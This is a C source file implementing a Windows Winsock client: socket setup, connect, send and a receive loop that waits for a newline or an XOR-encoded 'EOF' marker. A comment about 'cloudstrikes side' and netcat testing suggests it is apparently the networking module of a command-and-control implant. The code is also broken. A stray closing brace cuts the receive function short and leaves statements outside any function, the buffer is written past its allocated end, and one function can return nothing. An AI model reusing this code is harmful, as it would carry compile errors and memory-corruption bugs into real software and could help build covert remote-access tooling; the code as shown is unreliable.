#include "es2.h"

struct sockaddr_in server;
WSADATA wsaData;
SOCKET cs;
int alive_;

int es_init() {
	alive_ = 0;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup failed!\n");
		return(-1);
	}

	if ((cs = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
		printf("Failed to create Socket!\n%d\n", WSAGetLastError());
		return(-1);
	}
	return(0);
}

BOOL alive() {
	if (alive_ == 0) {
		return(FALSE);
	}
	else if (alive_ == 1) {
		return(TRUE);
	}
}

int es_connect(const char* ip, int port) {
	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	if (connect(cs, (struct sockaddr*)&server, sizeof(server)) < 0) {
		printf("Failed to connect to %s on port %i\n%d\n", ip, port, WSAGetLastError());
		alive_ = 0;
		return(-1);
	}
	alive_ = 1;
	return(0);
}

int es_send(const char* msg) {

	if (send(cs, msg, strlen(msg), 0) < 0) {
		printf("Failed to send data!\n%d\n", WSAGetLastError());
		alive_ = 0;
		return(-1);
	}
	return(0);
}

void* realloc_zero(void* pBuffer, size_t oldSize, size_t newSize) {
  void* pNew = realloc(pBuffer, newSize);
  if(pNew==NULL) {
      return(NULL);
  }
  if ( newSize > oldSize && pNew ) {
    size_t diff = newSize - oldSize;
    void* pStart = ((char*)pNew) + oldSize;
    memset(pStart, 0, diff);
  }
  return pNew;
}

response es_recv(int rcv_s) {
	puts("es_recv called!\n");
	int rcv_r = 0;
	char *rep= malloc(rcv_s);
	if (rep != NULL) {
		memset(rep, 0, rcv_s);
	}
	else {
		printf("Failed to allocate memory!\n");
		alive_ = 0;
		response err={"Failed to allocate memory!\n", strlen("Failed to allocate memory!\n")};
		return(err);
	}
	unsigned long int buf_sz = rcv_s+1;
	#if ENCODED == 1
		char eof[4]={'E'^0x1f, 'O'^0x1f, 'F'^0x1f, '\0'};
	#endif
	//maybe i need to cluster the sends on cloudstrikes side as every time i hit enter in netcat a realloc is done no matter how long the msg was!

	//setsockopt(cs, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(int));
	while ((rcv_r = recv(cs, rep, rcv_s, 0))> 0) {
		if(rcv_r==SOCKET_ERROR || rcv_r==0){
			printf("Failed to receive data!\n%d\n", WSAGetLastError());
			alive_ = 0;
			response err={"Failed to receive data!\n", strlen("Failed to receive data!\n")};
			return(err);
		}
		printf("rep: '%s'\nrcv_s: '%i'\nbuf_sz: '%i'\n", rep, rcv_s, buf_sz);
		//rep=realloc(rep, buf_sz);
		rep=realloc_zero(rep, buf_sz, buf_sz+rcv_r);
		printf("realloc: ErrNum: %i\n", errno);
		printf("realloc: err: %s\n", strerror(errno));
		if(rep==NULL){
			printf("Failed to allocate memory!\n");
			alive_ = 0;
			response err = {"Failed to allocate memory!\n", strlen("Failed to allocate memory!\n")};
			return(err);
		}
		printf("after realloc rep: '%s'\n", rep);
		#if ENCODED == 1
			puts("checking for encoded eof!");
			if(strstr(rep, eof)!=0){
				puts("eof(enc) found!\n");
				response r;
				//cut off eof
				rep[strlen(rep)-4]='\0';
				r.data=rep;
				r.buf_sz=buf_sz;
				printf("r.data: '%s'\n", r.data);
				printf("r.buf_sz: '%i'\n", r.buf_sz);
				puts("es_recv returning...\n");
				return(r);
			}
		#else
			puts("checking for newline as eof!");
			if(strchr(rep, '\n')!=0){
				puts("eof(newline) found!\n");
				response r;
				r.data=rep;
				r.buf_sz=buf_sz;
				printf("r.data: '%s'\n", r.data);
				printf("r.buf_sz: '%i'\n", r.buf_sz);
				puts("es_recv returning...\n");
				return(r);
			}
		#endif
		buf_sz += rcv_r;
		}
		printf("Failed to receive data (connection closed)!\n%d\n", WSAGetLastError());
		alive_ = 0;
		response err={"Failed to receive data (connection closed)!\n", strlen("Failed to receive data (connection closed)!\n")};
		return(err);
	}
	puts("es_recv returning...\n");
	rep[buf_sz] = '\0';
	response r;
	r.data=rep;
	r.buf_sz=buf_sz;
	puts("response struct filled!\nes_recv returning!\n");
	return(r);
}

int es_cleanup() {
	closesocket(cs);
	WSACleanup();
	return(0);
}
